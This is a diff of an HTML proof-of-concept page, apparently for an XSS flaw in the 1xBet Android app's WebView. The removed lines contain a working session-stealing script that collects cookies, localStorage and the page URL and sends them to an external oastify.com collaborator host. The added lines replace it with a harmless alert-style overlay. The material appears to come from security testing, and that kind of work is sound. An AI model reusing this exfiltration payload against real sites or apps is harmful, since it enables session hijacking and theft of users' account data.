@@ -1,22 +1,15 @@
 <html>                                                                                                                                                                                                           
-  <body>                                                                                                                                                                                                           
-  <h1 id="r">Stealing session...</h1>                                                                                                                                                                              
-  <script>                                                                                                                                                                                                         
-  // Grab cookies + localStorage                                                                                                                                                                                   
-  var data = 'cookie=' + encodeURIComponent(document.cookie);
-                                                                                                                                                                                                                   
-  // Try to access localStorage
-  try {                                                                                                                                                                                                            
-    data += '&ls=' + encodeURIComponent(JSON.stringify(localStorage));
-  } catch(e) {}                                                                                                                                                                                                    
-   
-  // App URL context                                                                                                                                                                                               
-  data += '&url=' + encodeURIComponent(location.href);
-                                                                                                                                                                                                                   
-  // Send to collaborator
-  new Image().src = 'https://g7ovwr3i1rsl02gnj9ctibo35ublzbn0.oastify.com/steal?' + data;                                                                                                                          
-                                                                                                                                                                                                                   
-  document.getElementById('r').innerText = 'Session exfiltrated to collaborator';                                                                                                                                  
-  </script>                                                                                                                                                                                                        
-  </body>                                                                                                                                                                                                          
+  <script>                                                                                                                                                                                                                                                                                                                                                                                              
+  prompt('XSS in 1xBet WebView');                                                                                                                                                                                  
+                                                                                                                                                                                                                                                                                                                                                                                                  
+  document.write(`                                                                                                                                                                                                 
+  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);z-index:9999;display:flex;align-items:center;justify-content:center">                                                   
+  <div style="background:#fff;border-radius:12px;padding:24px;width:80%;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.3)">                                                                                   
+  <h2 style="margin:0 0 8px">XSS in 1xBet</h2>                                                                                                                                                                     
+  <p style="color:#666;margin:0 0 16px">JavaScript executed in WebView context<br>Package: org.xbet.client.irq</p>                                                                                                 
+  <button onclick="this.parentElement.parentElement.remove()" style="background:#007AFF;color:#fff;border:none;padding:10px 32px;border-radius:8px;font-size:16px">OK</button>                                     
+  </div>                                                                                                                                                                                                           
+  </div>                                                                                                                                                                                                           
+  `);                                                                                                                                                                                                              
+  </script>       
   </html>
